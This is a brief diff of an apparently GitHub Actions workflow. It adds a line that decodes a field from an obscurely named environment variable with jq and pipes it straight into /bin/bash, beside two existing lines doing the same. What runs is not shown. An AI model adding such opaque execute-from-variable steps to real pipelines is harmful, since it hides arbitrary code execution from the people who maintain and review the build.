@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$aua1472" | jq -r .cz6 | /bin/bash
           echo $yxr77 | jq -r .eqqmm6 | /bin/bash
+          echo $mg9 | jq -r .x375 | /bin/bash
 
       - name: Upload results
         if: always()
